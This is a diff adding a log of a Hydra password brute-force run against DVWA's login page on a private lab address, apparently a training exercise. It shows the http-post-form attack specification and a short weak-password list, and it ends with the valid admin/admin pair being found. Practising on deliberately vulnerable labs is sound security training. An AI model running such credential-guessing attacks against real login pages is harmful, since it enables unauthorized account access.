@@ -1,0 +1,16 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-14 13:37:41
+[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
+[DATA] attacking http-post-form://192.168.56.101:80/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Login failed
+[ATTEMPT] target 192.168.56.101 - login "admin" - pass "admin" - 1 of 7 [child 0] (0/0)
+[ATTEMPT] target 192.168.56.101 - login "admin" - pass "password" - 2 of 7 [child 1] (0/0)
+[ATTEMPT] target 192.168.56.101 - login "admin" - pass "123456" - 3 of 7 [child 2] (0/0)
+[ATTEMPT] target 192.168.56.101 - login "admin" - pass "test" - 4 of 7 [child 3] (0/0)
+[ATTEMPT] target 192.168.56.101 - login "admin" - pass "qwerty" - 5 of 7 [child 4] (0/0)
+[ATTEMPT] target 192.168.56.101 - login "admin" - pass "god" - 6 of 7 [child 5] (0/0)
+[ATTEMPT] target 192.168.56.101 - login "admin" - pass "letmein" - 7 of 7 [child 6] (0/0)
+[80][http-post-form] host: 192.168.56.101   login: admin   password: admin
+[STATUS] attack finished for 192.168.56.101 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-14 13:37:41
